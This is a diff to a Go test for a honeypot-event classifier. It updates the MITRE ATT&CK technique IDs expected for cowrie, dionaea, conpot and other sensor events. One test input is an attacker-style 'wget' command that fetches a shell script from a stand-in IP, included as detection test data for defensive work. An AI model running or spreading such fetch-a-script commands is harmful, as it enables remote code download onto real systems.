@@ -20,13 +20,16 @@ func TestDefaultRulesMatchHoneypotEventNames(t *testing.T) {
 		{"cowrie", "cowrie.command.input", "wget http://203.0.113.9/x.sh", "", "T1105"},
 		{"adbhoney", "adbhoney.command", "id", "", "T1033"},
 		{"cowrie", "cowrie.login.failed", "", "root", "T1110"},
-		{"heralding", "heralding.login.failed", "", "admin", "T1110.004"},
-		{"dionaea", "dionaea.connection.accept", "", "", "T1046"},
-		{"endlessh", "endlessh.connection.accept", "", "", "T1046"},
-		{"cowrie", "cowrie.session.connect", "", "", "T1046"},
-		{"conpot", "conpot.modbus.new_connection", "", "", ""},
+		// A failed login is guessing; one event cannot tell stuffing (T1110.004).
+		{"heralding", "heralding.login.failed", "", "admin", "T1110"},
+		{"cowrie", "cowrie.login.success", "", "root", "T1078"},
+		{"dionaea", "dionaea.connection.accept", "", "", "T1595"},
+		{"endlessh", "endlessh.connection.accept", "", "", "T1595"},
+		{"cowrie", "cowrie.session.connect", "", "", "T1595"},
+		{"conpot", "conpot.modbus.new_connection", "", "", "T1595"},
 		{"conpot", "conpot.http.probe", "", "", "T0846"},
-		{"conpot", "conpot.s7comm.command", "", "", "T0855"},
+		{"conpot", "conpot.s7comm.command", "", "", "T1692.001"},
+		{"conpot", "conpot.modbus.read", "", "", "T0801"},
 		// Legacy bare names keep working.
 		{"cowrie", "login_failed", "", "root", "T1110"},
 		{"cowrie", "command", "whoami", "", "T1033"},
@@ -42,8 +45,8 @@ func TestDefaultRulesMatchHoneypotEventNames(t *testing.T) {
 	// A closed connection is not a new probe.
 	ev := makeEvent("endlessh", "endlessh.connection.close", "", "")
 	c.Classify(context.Background(), ev)
-	if ev.TechniqueID == "T1046" {
-		t.Error("endlessh.connection.close classified as network service discovery")
+	if ev.TechniqueID != "" {
+		t.Errorf("endlessh.connection.close classified as %s", ev.TechniqueID)
 	}
 }
 
